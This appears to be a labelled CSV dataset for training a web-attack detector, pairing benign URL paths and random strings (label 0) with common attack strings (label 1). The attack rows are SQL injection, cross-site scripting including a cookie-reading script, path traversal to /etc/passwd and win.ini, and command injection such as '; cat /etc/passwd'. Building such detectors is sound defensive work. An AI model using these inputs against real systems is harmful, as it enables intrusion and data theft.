payload,label
/register?session=26318,0
admin%00' OR 1=1,1
/user?id=6968,0
<script>var a=613;alert(a)</script>,1
<script>var a=842;alert(a)</script>,1
Xn92ApLqH7S,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 3=9 --,1
/profile?id=981,0
/login?id=87,0
checkout,0
admin'/* bypass */OR 1=1,1
<script>var a=800;alert(a)</script>,1
/home?id=8074,0
index,0
s E l E c T * f R o M a d m i n,1
<script>var a=722;alert(a)</script>,1
/about?session=73218,0
' OR 7=7 --,1
kx9TRyXd,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?session=52045,0
/dashboard?session=15836,0
<script>var a=719;alert(a)</script>,1
/login?session=38530,0
<script>var a=113;alert(a)</script>,1
onerror=alert(1),1
onerror=alert(1),1
/profile?session=55187,0
/checkout?session=95639,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
/login?id=5777,0
/dashboard?session=28898,0
qU6CKGWmk,0
s E l E c T * f R o M a d m i n,1
/user?session=81423,0
/dashboard?id=7895,0
; cat /etc/passwd,1
/checkout?id=6896,0
cart,0
settings,0
/user?id=4029,0
/register?session=53418,0
/blog?id=6981,0
index,0
; cat /etc/passwd,1
R6SzndWFJX5THja,0
admin%00' OR 1=1,1
<script>var a=963;alert(a)</script>,1
' OR 6=1 --,1
search,0
' OR 3=5 --,1
6dbo6Caf0q4IPOn,0
' OR 3=8 --,1
<script>var a=159;alert(a)</script>,1
; cat /etc/passwd,1
' OR 3=9 --,1
/cart?session=40521,0
' OR 8=3 --,1
d2H15p5G0GmQG,0
<script>var a=83;alert(a)</script>,1
/home?id=6860,0
<script>var a=402;alert(a)</script>,1
home,0
../../../windows/win.ini,1
/home?session=69180,0
DR1pObEMlS,0
M11z0b6ONLX,0
/home?session=60179,0
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
profile,0
' OR 2=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=3 --,1
javascript:alert(1),1
' OR 9=3 --,1
javascript:alert(1),1
/login?session=30128,0
' OR 9=2 --,1
/cart?session=15930,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=959;alert(a)</script>,1
<script>var a=135;alert(a)</script>,1
/checkout?session=13255,0
/about?session=67919,0
' OR '1'='1,1
xmnefoFFYRb,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
/cart?id=9194,0
settings,0
register,0
/cart?session=31713,0
/checkout?session=97233,0
' OR 9=8 --,1
' OR 4=8 --,1
/login?id=4105,0
uANJFqA2r,0
admin' --,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?id=7940,0
lmJr0nx9X,0
/dashboard?session=69472,0
' OR 3=9 --,1
javascript:alert(1),1
' OR 8=8 --,1
about,0
contact,0
; cat /etc/passwd,1
; cat /etc/passwd,1
' OR 1=1 --,1
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=75;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
user,0
/search?id=3926,0
; cat /etc/passwd,1
<script>var a=184;alert(a)</script>,1
/register?session=28387,0
' OR 5=4 --,1
P3Aj2jLpUP2A,0
/contact?session=30259,0
/contact?id=5938,0
/user?id=730,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
qgPlbt6Iy7i,0
javascript:alert(1),1
bduDnvhaO,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?session=78090,0
about,0
/dashboard?id=3279,0
checkout,0
checkout,0
' OR 9=8 --,1
../../../../etc/passwd,1
' OR 9=7 --,1
about,0
login,0
login,0
cbfzkPBP725l,0
/checkout?session=97691,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?session=31017,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
ZBPsjbMorO,0
' OR 6=6 --,1
<script>var a=45;alert(a)</script>,1
/checkout?id=5514,0
' OR 2=9 --,1
dashboard,0
/search?session=18560,0
' OR 1=1 --,1
settings,0
<script>var a=322;alert(a)</script>,1
contact,0
/settings?session=44111,0
profile,0
' OR 3=4 --,1
admin%00' OR 1=1,1
' OR 6=6 --,1
<script>alert(document.cookie)</script>,1
' OR 3=8 --,1
1' o r '1'='1,1
; cat /etc/passwd,1
1glQhYieIz2FUS,0
; cat /etc/passwd,1
blog,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
jVzGl4l0zW,0
/login?id=9907,0
index,0
/cart?session=81185,0
J3Sz3DUV,0
user,0
' OR 1=1 --,1
search,0
<script>var a=901;alert(a)</script>,1
/home?id=7472,0
/register?session=84525,0
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
' OR 5=1 --,1
profile,0
' OR 9=6 --,1
checkout,0
LVItuLxJhw4wZJ,0
/dashboard?session=92244,0
/settings?id=7728,0
/about?session=58592,0
settings,0
/about?session=68823,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=5 --,1
nB6VXOVSJ4IZE,0
<script>var a=194;alert(a)</script>,1
ID5ntQx6zJmeHe1,0
/about?id=3182,0
cart,0
/index?id=9894,0
/about?id=1563,0
/contact?id=5105,0
/profile?session=61010,0
onerror=alert(1),1
/dashboard?id=9808,0
jeorcvF0aj,0
rCmwHbAMuTD,0
leqK5GVn,0
home,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
/home?session=38140,0
contact,0
admin' --,1
/dashboard?id=9431,0
javascript:alert(1),1
' OR '1'='1,1
' OR 1=1 --,1
Uk5TgaNUmKTh8,0
/settings?session=54929,0
86GxUiLaW,0
' OR 3=1 --,1
X93YT2x48iQ,0
admin%00' OR 1=1,1
/contact?session=28848,0
<script>var a=183;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=665;alert(a)</script>,1
/about?session=27747,0
/blog?session=85917,0
/checkout?session=75946,0
' OR 1=1 --,1
/register?id=2841,0
/cart?id=2012,0
/contact?session=74727,0
/profile?id=8953,0
; cat /etc/passwd,1
../../../windows/win.ini,1
' OR 5=3 --,1
<script>var a=404;alert(a)</script>,1
' OR 5=7 --,1
login,0
| whoami,1
/contact?session=98693,0
about,0
TPfh5Zrv5hEhDc7,0
contact,0
2E4dcwK5rDELJ,0
/cart?id=3818,0
onerror=alert(1),1
KNazSlvDR4qT9T,0
blog,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?id=7786,0
' OR 8=2 --,1
user,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?session=35299,0
../../../../etc/passwd,1
home,0
javascript:alert(1),1
/dashboard?id=7144,0
/blog?session=17922,0
/login?session=45868,0
/about?id=930,0
Qhp1XNjQf,0
../../../../etc/passwd,1
index,0
admin'/* bypass */OR 1=1,1
/home?id=1516,0
/dashboard?id=5141,0
index,0
/contact?session=37914,0
login,0
<script>var a=743;alert(a)</script>,1
' OR 9=2 --,1
/settings?session=21883,0
' OR '1'='1,1
../../../windows/win.ini,1
admin%00' OR 1=1,1
JvofQmM0ANkANok,0
/blog?id=8847,0
<script>alert(document.cookie)</script>,1
about,0
s E l E c T * f R o M a d m i n,1
/user?session=73167,0
' OR 2=2 --,1
/contact?session=79971,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?id=598,0
<script>var a=147;alert(a)</script>,1
/checkout?id=1506,0
07GsETUJPN0QT9,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=446;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=2 --,1
admin%00' OR 1=1,1
about,0
VI8qBp4D54rIVI1,0
dashboard,0
/dashboard?id=3332,0
/about?id=2964,0
/search?session=26621,0
<script>var a=322;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=8171,0
<script>var a=177;alert(a)</script>,1
/profile?id=8316,0
/search?session=70166,0
eEr0P1eBz,0
/dashboard?id=2657,0
FMqJ1NjS,0
onerror=alert(1),1
../../../windows/win.ini,1
home,0
/dashboard?id=784,0
s E l E c T * f R o M a d m i n,1
/user?session=35713,0
/register?id=6886,0
' OR 4=9 --,1
login,0
home,0
/register?id=980,0
eIjwBStRHvq2TZh,0
/settings?id=1708,0
' OR 6=5 --,1
/checkout?id=6785,0
oa3oFa44FIvGxDz,0
' OR 7=1 --,1
' OR 6=6 --,1
' OR 1=1 --,1
UutVU6RFVur1K,0
s E l E c T * f R o M a d m i n,1
YfDGH4CrvBs,0
/checkout?id=5823,0
' OR 3=7 --,1
/contact?session=54747,0
/login?session=12250,0
/search?id=3536,0
dashboard,0
/cart?id=6823,0
about,0
/cart?session=74157,0
/contact?session=35716,0
/login?session=11734,0
/blog?session=12013,0
../../../../etc/passwd,1
/index?session=63401,0
<script>var a=990;alert(a)</script>,1
<script>var a=230;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
/home?session=99140,0
uS6Gr208wx,0
/user?session=87455,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
index,0
' OR 2=6 --,1
/settings?session=11758,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 8=5 --,1
' OR 1=1 --,1
<script>var a=474;alert(a)</script>,1
yZBoyFAln7,0
' OR 7=3 --,1
admin'/* bypass */OR 1=1,1
/search?session=10639,0
/about?id=6622,0
admin' --,1
' OR 6=8 --,1
/settings?id=6053,0
xPaJwjPh0wVnK,0
bvs6Cuyw,0
admin'/* bypass */OR 1=1,1
<script>var a=780;alert(a)</script>,1
/profile?session=19589,0
1' o r '1'='1,1
/user?session=59603,0
about,0
' OR 6=4 --,1
/settings?session=58250,0
' OR '1'='1,1
qFSNm32Me,0
/home?session=80902,0
/register?id=8538,0
1' o r '1'='1,1
../../../windows/win.ini,1
/profile?id=4577,0
6zk8Vis2ZxyM,0
H4KsFpPO5vJ9,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=39517,0
../../../../etc/passwd,1
1' o r '1'='1,1
/index?id=1876,0
onerror=alert(1),1
<script>var a=168;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/search?id=249,0
<script>alert(document.cookie)</script>,1
/home?id=2352,0
/login?session=61648,0
register,0
/about?id=6447,0
<script>var a=841;alert(a)</script>,1
' OR 5=4 --,1
JkpIOjwVzt,0
<script>var a=444;alert(a)</script>,1
BgAMzc8pYAqufv,0
onerror=alert(1),1
/cart?session=37636,0
' OR 3=5 --,1
KG3VTDk3QEQap7z,0
; cat /etc/passwd,1
<script>var a=526;alert(a)</script>,1
' OR 6=1 --,1
jQxeDTSli,0
/contact?id=5605,0
/index?session=56680,0
admin'/* bypass */OR 1=1,1
/search?id=733,0
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
XiRAAu3s8Y,0
blog,0
' OR 5=8 --,1
/register?session=69754,0
/search?session=82729,0
' OR 1=1 --,1
/user?id=3571,0
onerror=alert(1),1
; cat /etc/passwd,1
; cat /etc/passwd,1
<script>var a=790;alert(a)</script>,1
' OR 8=5 --,1
cart,0
admin%00' OR 1=1,1
/cart?session=19918,0
/settings?id=7038,0
checkout,0
<script>alert(document.cookie)</script>,1
' OR 5=9 --,1
' OR 2=3 --,1
<script>var a=734;alert(a)</script>,1
onerror=alert(1),1
ohufVCVs1zaJ,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
register,0
<script>var a=998;alert(a)</script>,1
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
about,0
a8vUCGkC,0
/settings?session=98323,0
' OR 1=5 --,1
' OR 1=1 --,1
<script>var a=987;alert(a)</script>,1
' OR '1'='1,1
/dashboard?session=90412,0
admin%00' OR 1=1,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
/profile?session=91128,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?session=56627,0
/user?session=75290,0
about,0
<script>alert(document.cookie)</script>,1
/profile?id=7635,0
/blog?id=394,0
/home?id=9570,0
index,0
admin' --,1
login,0
/search?id=5564,0
<script>var a=744;alert(a)</script>,1
/checkout?id=697,0
<script>var a=386;alert(a)</script>,1
cart,0
<script>alert(document.cookie)</script>,1
/register?id=649,0
' OR '1'='1,1
/profile?session=80736,0
f47jH5rUUtnDk,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
Ac8IAgb471Z,0
/register?session=16485,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
settings,0
../../../../etc/passwd,1
onerror=alert(1),1
/index?session=60246,0
../../../windows/win.ini,1
' OR 3=9 --,1
rpqEzjQAjRpNk2,0
bpXiO5jygPHrSQ,0
admin'/* bypass */OR 1=1,1
profile,0
dK3Pq7rNLCfkcv,0
search,0
checkout,0
/index?session=54815,0
../../../../etc/passwd,1
/search?session=33177,0
../../../windows/win.ini,1
/settings?session=89381,0
' OR 4=5 --,1
<script>var a=207;alert(a)</script>,1
/checkout?id=4767,0
home,0
profile,0
/about?session=33227,0
cart,0
javascript:alert(1),1
index,0
/blog?session=15116,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
search,0
s E l E c T * f R o M a d m i n,1
<script>var a=221;alert(a)</script>,1
admin%00' OR 1=1,1
FUrPkuvBr,0
profile,0
' OR 1=9 --,1
/cart?session=85359,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
' OR 7=7 --,1
checkout,0
../../../windows/win.ini,1
/about?id=7547,0
home,0
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
../../../windows/win.ini,1
javascript:alert(1),1
/cart?id=6113,0
| whoami,1
<script>var a=583;alert(a)</script>,1
<script>var a=352;alert(a)</script>,1
' OR 1=1 --,1
/checkout?session=67083,0
dashboard,0
checkout,0
onerror=alert(1),1
register,0
/about?session=92493,0
' OR 2=9 --,1
1' o r '1'='1,1
index,0
index,0
/dashboard?id=8468,0
index,0
<script>var a=831;alert(a)</script>,1
' OR 9=5 --,1
<script>var a=758;alert(a)</script>,1
<script>var a=655;alert(a)</script>,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
wXcFiuuDPB8mJu,0
/search?id=6466,0
NOi2ryAXr77H,0
<script>var a=916;alert(a)</script>,1
' OR 3=2 --,1
' OR 5=4 --,1
dashboard,0
/register?id=5709,0
/dashboard?id=6781,0
/contact?session=18135,0
checkout,0
user,0
admin' --,1
dashboard,0
rsq0tfz0,0
index,0
profile,0
' OR 1=1 --,1
/dashboard?session=91473,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=935;alert(a)</script>,1
home,0
<script>var a=219;alert(a)</script>,1
/cart?id=1191,0
7yzpjXWtq0,0
/checkout?id=6794,0
/user?id=6912,0
' OR '1'='1,1
<script>var a=518;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?session=79446,0
' OR 8=8 --,1
home,0
' OR 5=4 --,1
/user?session=99059,0
' OR '1'='1,1
<script>var a=729;alert(a)</script>,1
CWYHT3bEsmrVazK,0
05mQrgyPqPBEy,0
| whoami,1
/search?session=35688,0
1AnxFtRpb,0
<script>alert(document.cookie)</script>,1
/home?id=8432,0
/blog?session=23040,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 4=9 --,1
ud8cmzGGesU6xwT,0
<script>alert(document.cookie)</script>,1
about,0
GHXGJTp1cFs,0
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
bsOgzjiA1ekrY,0
; cat /etc/passwd,1
' OR 1=5 --,1
register,0
3SDLkLy2DA,0
CtNxzQy5GtJ2M6m,0
' OR 3=9 --,1
onerror=alert(1),1
ZNEGdxneBZ,0
' OR '1'='1,1
home,0
/user?id=7651,0
' OR 8=2 --,1
LzZHoJIuuFm,0
' OR 1=1 --,1
<script>var a=946;alert(a)</script>,1
/user?session=32746,0
/register?session=28178,0
MFNMHTwISQWSP,0
' OR 2=1 --,1
s E l E c T * f R o M a d m i n,1
/contact?id=2962,0
index,0
/checkout?session=90594,0
../../../windows/win.ini,1
profile,0
/blog?id=1826,0
<script>var a=821;alert(a)</script>,1
d16lY7Zz1,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
ZHTd1AuPms,0
register,0
/contact?id=9022,0
<script>var a=521;alert(a)</script>,1
<script>var a=20;alert(a)</script>,1
about,0
<script>var a=707;alert(a)</script>,1
/profile?id=525,0
admin'/* bypass */OR 1=1,1
/search?session=26781,0
' OR 8=7 --,1
/user?id=6842,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
../../../windows/win.ini,1
/dashboard?id=209,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=525;alert(a)</script>,1
../../../windows/win.ini,1
/dashboard?session=12440,0
QriRxWDJH,0
' OR 4=7 --,1
<script>var a=954;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
blog,0
admin%00' OR 1=1,1
/settings?id=6973,0
' OR 7=7 --,1
1' o r '1'='1,1
Ue84V9BiNeae3,0
; cat /etc/passwd,1
/checkout?id=7166,0
register,0
dashboard,0
<script>alert(document.cookie)</script>,1
gvhZyrVuG9W0,0
' OR '1'='1,1
<script>var a=417;alert(a)</script>,1
contact,0
onerror=alert(1),1
' OR 4=6 --,1
<script>var a=508;alert(a)</script>,1
' OR '1'='1,1
/checkout?session=69575,0
index,0
1' o r '1'='1,1
/home?session=94801,0
' OR 1=1 --,1
' OR 5=5 --,1
cart,0
oNwmtOzjx,0
checkout,0
/settings?session=70826,0
; cat /etc/passwd,1
index,0
' OR 1=1 --,1
/dashboard?session=42496,0
CrskPZ2Ec5Zxmfx,0
dashboard,0
<script>alert(document.cookie)</script>,1
/checkout?session=78693,0
admin' --,1
/user?id=50,0
about,0
index,0
yx9DHs18gBeHcjD,0
; cat /etc/passwd,1
cart,0
javascript:alert(1),1
settings,0
9Mi2GO5M,0
onerror=alert(1),1
/home?id=9264,0
../../../windows/win.ini,1
home,0
' OR 2=3 --,1
/search?id=9332,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
VtAlgNvKot,0
<script>alert(document.cookie)</script>,1
' OR 3=7 --,1
' OR 3=7 --,1
' OR 3=2 --,1
F9AkFOhD,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cT95KfaUwJr,0
' OR 7=2 --,1
index,0
/contact?id=1774,0
' OR 7=6 --,1
onerror=alert(1),1
5MiddsjC,0
/register?id=9042,0
onerror=alert(1),1
admin' --,1
/settings?session=29963,0
profile,0
register,0
index,0
' OR '1'='1,1
1' o r '1'='1,1
; cat /etc/passwd,1
admin' --,1
/checkout?id=555,0
admin' --,1
/register?id=8299,0
/checkout?id=9204,0
/dashboard?session=44620,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=164;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=73119,0
/home?id=291,0
| whoami,1
settings,0
hBWn7Hvs,0
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
<script>var a=207;alert(a)</script>,1
<script>var a=136;alert(a)</script>,1
uoqvNQjIu6VQVV,0
admin' --,1
<script>var a=646;alert(a)</script>,1
home,0
<script>var a=539;alert(a)</script>,1
/dashboard?session=93844,0
onerror=alert(1),1
user,0
/home?id=135,0
<script>var a=294;alert(a)</script>,1
tOnsWxRNQy,0
admin'/* bypass */OR 1=1,1
/settings?id=4834,0
contact,0
/profile?session=95464,0
' OR 6=9 --,1
; cat /etc/passwd,1
/profile?session=92211,0
<script>var a=512;alert(a)</script>,1
admin%00' OR 1=1,1
/login?id=8132,0
blog,0
s E l E c T * f R o M a d m i n,1
/dashboard?session=47117,0
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
javascript:alert(1),1
7rbgDbp9I,0
../../../../etc/passwd,1
gZSB7TuE2,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
/blog?id=2248,0
contact,0
/about?id=8766,0
' OR 1=1 --,1
/index?id=3384,0
/dashboard?session=70451,0
| whoami,1
9VtKINBe3w,0
/search?session=68155,0
/checkout?id=3082,0
MBtsLkf6MqvIo,0
admin' --,1
; cat /etc/passwd,1
yFNkeuzyRuD,0
javascript:alert(1),1
/user?session=33306,0
<script>var a=404;alert(a)</script>,1
dashboard,0
<script>var a=959;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=779;alert(a)</script>,1
<script>var a=87;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
' OR 1=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=37884,0
/user?id=2996,0
admin' --,1
Cu8p1A417,0
../../../windows/win.ini,1
../../../windows/win.ini,1
register,0
1' o r '1'='1,1
VbNpdPxHF0,0
' OR 4=1 --,1
KfKPQLd5Qs,0
login,0
home,0
<script>var a=488;alert(a)</script>,1
onerror=alert(1),1
/home?id=6473,0
' OR 1=1 --,1
/register?id=1701,0
' OR 9=8 --,1
' OR 5=2 --,1
cart,0
admin' --,1
/blog?session=62481,0
1' o r '1'='1,1
admin' --,1
profile,0
s E l E c T * f R o M a d m i n,1
/about?id=8671,0
<script>var a=838;alert(a)</script>,1
/login?id=6000,0
1' o r '1'='1,1
admin%00' OR 1=1,1
<script>var a=609;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
eSjt5O6x6craTT,0
<script>var a=625;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
JCDioo2dy45GN,0
/checkout?id=8073,0
/about?session=74503,0
/profile?id=6290,0
<script>var a=778;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
/profile?id=3460,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=918;alert(a)</script>,1
<script>var a=47;alert(a)</script>,1
r34JmansizinjVm,0
admin%00' OR 1=1,1
/profile?id=608,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
/about?session=14501,0
admin' --,1
../../../windows/win.ini,1
; cat /etc/passwd,1
/about?session=35023,0
<script>var a=261;alert(a)</script>,1
/home?id=7636,0
javascript:alert(1),1
/dashboard?session=29676,0
/settings?session=42980,0
<script>var a=698;alert(a)</script>,1
/profile?id=6811,0
SMYCsXmv6pY,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
<script>var a=306;alert(a)</script>,1
/login?session=48222,0
| whoami,1
search,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
Xg2TCXBZWq6c7l,0
IIHzfaJGljm3,0
<script>var a=101;alert(a)</script>,1
1' o r '1'='1,1
<script>var a=565;alert(a)</script>,1
/profile?id=6811,0
index,0
' OR 5=3 --,1
<script>var a=637;alert(a)</script>,1
<script>var a=80;alert(a)</script>,1
<script>var a=494;alert(a)</script>,1
/login?id=7530,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=339;alert(a)</script>,1
/cart?id=9629,0
contact,0
<script>var a=953;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
/index?session=57214,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
eQDm1FZqC0ih,0
/contact?id=4830,0
/contact?session=91678,0
admin'/* bypass */OR 1=1,1
/contact?session=69784,0
/home?session=22493,0
profile,0
<script>var a=687;alert(a)</script>,1
/index?session=52163,0
contact,0
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
contact,0
/about?id=443,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
<script>var a=817;alert(a)</script>,1
| whoami,1
/search?id=7323,0
<script>var a=323;alert(a)</script>,1
' OR 3=8 --,1
<script>var a=899;alert(a)</script>,1
/login?session=51705,0
' OR 7=8 --,1
<script>alert(document.cookie)</script>,1
profile,0
<script>var a=175;alert(a)</script>,1
<script>var a=436;alert(a)</script>,1
onerror=alert(1),1
' OR '1'='1,1
/about?session=38230,0
<script>var a=352;alert(a)</script>,1
1' o r '1'='1,1
1' o r '1'='1,1
javascript:alert(1),1
admin%00' OR 1=1,1
' OR '1'='1,1
about,0
glA8DeauRif,0
X8Nvsbkoi2kBP,0
s E l E c T * f R o M a d m i n,1
<script>var a=364;alert(a)</script>,1
' OR 2=7 --,1
/dashboard?id=6117,0
<script>var a=633;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
checkout,0
<script>var a=437;alert(a)</script>,1
cart,0
Trxlh0P9yS,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
/register?id=8282,0
<script>var a=98;alert(a)</script>,1
/settings?id=3132,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?id=2550,0
admin' --,1
/index?session=15156,0
<script>var a=578;alert(a)</script>,1
beqjNc8qTwSud,0
<script>var a=71;alert(a)</script>,1
33uuo8q0,0
' OR 1=8 --,1
/dashboard?id=6829,0
/home?id=974,0
DyumOHpmZPJz5ub,0
/index?id=3038,0
/search?session=97975,0
../../../windows/win.ini,1
/login?id=1819,0
/contact?id=6916,0
vcsf8jFmjDhnyo,0
settings,0
LCDVH4xr,0
../../../windows/win.ini,1
onerror=alert(1),1
ep36JRLfAg,0
/dashboard?session=78218,0
' OR 3=2 --,1
ZTxyin5pEJa,0
about,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
profile,0
home,0
../../../windows/win.ini,1
/checkout?session=83087,0
Man6UrYo29a6We5,0
/profile?id=2395,0
/checkout?session=20502,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
yoqi9dhQCm,0
1' o r '1'='1,1
/register?session=51317,0
/search?id=8387,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
settings,0
admin' --,1
uacGUn1CGK,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?id=5741,0
<script>var a=639;alert(a)</script>,1
qpLiUEOHLTTldiy,0
/search?session=39302,0
/register?id=2819,0
javascript:alert(1),1
settings,0
about,0
profile,0
OtHPSWmq8X,0
onerror=alert(1),1
../../../../etc/passwd,1
/register?session=67871,0
/search?id=1308,0
' OR '1'='1,1
register,0
' OR '1'='1,1
profile,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?id=4028,0
../../../../etc/passwd,1
sPC1NbkJUM,0
/about?session=38723,0
z0D8OnuwRk4nZp,0
checkout,0
/contact?session=14576,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
' OR 8=9 --,1
home,0
' OR 8=5 --,1
blog,0
/contact?id=1335,0
<script>var a=364;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=564;alert(a)</script>,1
/dashboard?session=71684,0
onerror=alert(1),1
vM23JVqnO3T,0
s E l E c T * f R o M a d m i n,1
/cart?id=8169,0
| whoami,1
javascript:alert(1),1
/contact?session=68250,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=476;alert(a)</script>,1
<script>var a=929;alert(a)</script>,1
/login?session=87510,0
h27XZR2NKTb,0
' OR 1=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=194;alert(a)</script>,1
' OR 5=8 --,1
/profile?session=11829,0
/register?session=97157,0
' OR 1=8 --,1
| whoami,1
/cart?session=94442,0
' OR 4=7 --,1
<script>var a=752;alert(a)</script>,1
/about?id=4007,0
' OR 7=4 --,1
/register?session=48010,0
/blog?session=78151,0
blog,0
admin'/* bypass */OR 1=1,1
/register?id=7190,0
<script>var a=320;alert(a)</script>,1
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=5383,0
' OR '1'='1,1
4XgolSuhC8kix,0
javascript:alert(1),1
/settings?id=1117,0
login,0
/login?id=7562,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
3ZuPePjkuHHT2rt,0
/user?id=9158,0
/home?id=7894,0
<script>var a=65;alert(a)</script>,1
<script>var a=518;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=633;alert(a)</script>,1
admin' --,1
Zq1x0PifXDK,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=685;alert(a)</script>,1
settings,0
<script>var a=469;alert(a)</script>,1
' OR 1=1 --,1
' OR 1=9 --,1
dashboard,0
' OR 9=1 --,1
../../../windows/win.ini,1
settings,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
